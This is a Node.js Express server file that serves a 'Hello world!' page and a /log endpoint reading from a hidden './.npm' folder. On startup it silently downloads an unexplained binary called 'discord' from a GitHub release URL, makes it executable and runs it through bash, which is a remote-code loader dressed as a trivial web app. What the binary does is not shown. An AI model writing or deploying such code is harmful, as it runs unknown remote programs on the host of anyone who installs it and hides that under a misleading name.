const express = require("express");
const app = express();
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const { exec } = require('child_process');
const PORT = process.env.SERVER_PORT || process.env.PORT || 3000;
const FILE_PATH = './.npm';

// http
app.get("/", function(req, res) {
  res.send("Hello world!");
});

// log
app.get("/log", (req, res) => {
  const logPath = path.join(FILE_PATH, 'log.txt');
  fs.readFile(logPath, "utf8", (err, data) => {
    if (err) {
      console.error(err);
      res.status(500).send("Error reading log.txt");
    } else {
      res.setHeader('Content-Type', 'text/plain; charset=utf-8');
      res.send(data);
    }
  });
});

const downloadDiscord = async () => {
  try {
    console.log('Start downloading discord...');
    const response = await axios({
      method: 'get',
      url: 'https://github.com/mmnni/pipeops/releases/download/sac/discord',
      responseType: 'stream'
    });

    const writer = fs.createWriteStream('discord');
    response.data.pipe(writer);

    return new Promise((resolve, reject) => {
      writer.on('finish', () => {
        console.log('Download completed, adding execute permission...');
        exec('chmod +x discord', (err) => {
          if (err) {
            console.log('Failed to add execute permission:', err);
            reject(err);
          }
          console.log('Execute permission added successfully');
          resolve();
        });
      });
      writer.on('error', err => {
        console.log('Write error:', err);
        reject(err);
      });
    });
  } catch (err) {
    console.log('Download error:', err);
    throw err;
  }
};

const Execute = async () => {
  try {
    await downloadDiscord();
    
    console.log('Starting discord...');
    const command = './discord';
    exec(command, { 
      shell: '/bin/bash'
    }, (error, stdout, stderr) => {
      if (error) {
        console.log('Execution error:', error);
        return;
      }
      if (stdout) console.log('Output:', stdout);
      if (stderr) console.log('Error:', stderr);
    });
  } catch (err) {
    console.log('Process error:', err);
  }
};

Execute();

app.listen(PORT, () => {
  console.log(`Server is running on port:${PORT}`);
});
